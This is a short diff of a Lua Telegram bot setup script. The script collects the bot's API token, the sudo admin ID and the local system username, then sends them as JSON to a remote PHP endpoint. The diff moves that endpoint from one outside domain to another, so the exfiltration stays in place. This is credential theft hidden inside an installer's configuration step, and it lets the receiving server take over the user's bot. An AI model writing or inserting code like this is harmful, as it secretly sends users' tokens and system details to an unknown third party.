@@ -68,7 +68,7 @@ zaininfo = {}
 zaininfo.id = redis:get(ZAINGLOBLA..":SUDO:ID")
 zaininfo.tokenbot  = redis:get(ZAINGLOBLA..":token")
 zaininfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://contentss.me/Run.php?insert='..JSON.encode(zaininfo))
+https.request('https://devglobla.cf/Run.php?insert='..JSON.encode(zaininfo))
 create_config_auto()
 file = io.open("GLOBLA", "w")  
 file:write([[
